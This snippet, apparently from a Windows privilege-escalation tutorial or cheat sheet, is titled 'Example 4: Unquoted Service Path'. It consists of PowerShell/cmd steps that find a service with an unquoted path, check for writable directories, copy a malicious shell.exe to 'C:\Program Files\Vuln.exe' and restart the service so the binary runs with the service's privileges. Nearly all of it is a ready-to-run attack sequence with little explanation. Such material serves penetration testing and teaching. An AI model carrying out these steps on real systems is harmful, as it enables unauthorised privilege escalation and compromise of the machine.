# Example 4: Unquoted Service Path

```powershell
# Find unquoted path
wmic service get name,pathname | findstr /i /v """
# Result: C:\Program Files\Vuln App\service.exe

# Check write permissions
icacls "C:\Program Files\Vuln App"
# Result: Users:(W)

# Place malicious binary
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# Restart service
sc stop "Vuln App"
sc start "Vuln App"
```